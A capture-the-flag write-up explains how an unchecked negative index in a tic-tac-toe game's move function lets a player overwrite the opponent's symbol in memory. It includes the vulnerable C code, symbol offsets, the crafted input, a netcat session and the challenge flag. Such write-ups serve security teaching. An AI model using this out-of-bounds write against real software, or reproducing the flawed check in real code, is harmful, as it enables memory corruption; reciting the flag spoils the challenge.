## Vulnerability

`playerMove()` has a flawed bounds check:

```c
if(index >= 0 && index < 9 && board[index] != ' ')
    printf("Invalid move.\n");
else
    board[index] = player; // OOB write when index < 0 or >= 9
```

Entering row/col outside 1–3 lets us write 'X' at arbitrary offsets from `board[]`.

## Target

Three key globals exist in memory:

```c
char board[9];       // global BSS
char player = 'X';   // global DATA
char computer = 'O'; // global DATA
```

If we overwrite computer with 'X', then `computer == player == 'X'`.
The AI will place 'X' marks instead of 'O', making a three-in-a-row of 'X' inevitable. Since `checkWin()` returns 'X' and player == 'X', the game thinks we won and prints the flag.

```bash
$ nm ./chall | grep -E 'board|computer'
0000000000004068 B board
0000000000004051 D computer
```

Offset: `0x4051 - 0x4068 = -23`. Overwriting computer with 'X' makes the AI place 'X' instead of 'O', guaranteeing a three-in-a-row of 'X' — which the game counts as our win.
Computer lives 23 bytes before board in memory. We need:

```txt
(row - 1) * 3 + (col - 1) = -23
```

Which one of the solutions is `(row,col) = (-7,2)`.

## Solve

```bash
(hacking) night@me:~/lactf/pwn$ nc chall.lac.tf 30001
You want the flag? You'll have to beat me first!
   |   |   
---|---|---
   |   |   
---|---|---
   |   |   

Enter row #(1-3): -7
Enter column #(1-3): 2

   |   |   
---|---|---
   | X |   
---|---|---
   |   |   

Enter row #(1-3): 1
Enter column #(1-3): 1

 X |   |   
---|---|---
   | X |   
---|---|---
   |   | X 

How's this possible? Well, I guess I'll have to give you the flag now.
lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}
```
